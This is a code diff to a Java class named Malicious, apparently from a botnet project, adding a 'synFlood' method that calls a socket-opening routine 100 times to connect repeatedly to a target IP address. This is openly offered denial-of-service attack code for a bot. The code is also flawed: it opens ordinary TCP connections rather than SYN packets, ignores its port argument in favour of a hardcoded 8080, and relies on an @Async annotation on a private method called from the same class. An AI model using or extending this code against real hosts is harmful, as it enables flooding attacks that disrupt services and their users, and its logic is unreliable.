@@ -1,13 +1,18 @@
 package cs.sii.bot.action;
 
 import java.io.File;
+import java.io.IOException;
+import java.net.Socket;
 import java.util.Arrays;
 import java.util.List;
+import java.util.Timer;
 
+import org.springframework.scheduling.annotation.Async;
 import org.springframework.stereotype.Service;
 
 @Service
 public class Malicious {
+
 
 	/**
 	 * @param msg
@@ -17,6 +22,18 @@ public class Malicious {
 		System.out.println("synflood  " + msg);
 
 	}
+	
+	/**
+	 * @param ip_address
+	 * @param port
+	 * @param time
+	 */
+	public void synFlood(String ip_address,int port,int time) {
+		System.out.println("Socket Attack  ");
+		//Il numero 100 indica i processi in parallelo
+		for(int i=0;i<100;i++)
+	        createSocket(ip_address, port,time);
+	    }
 
 	/**
 	 * @param msg
@@ -112,4 +129,29 @@ public class Malicious {
 		return "";
 	}
 
+	
+	
+
+	
+		@Async 
+		private void createSocket(String ip,int port,int time){
+                  try {
+                	  int i=0;
+                	  while(i<time){
+                		  Socket socket=new Socket(ip,8080);
+                		  i++;
+                	  }             	  
+				} catch (IOException e) {
+					// TODO Auto-generated catch block
+					e.printStackTrace();
+				}
+
+	}
+	
+	
+	
+	
+	
+	
+	
 }
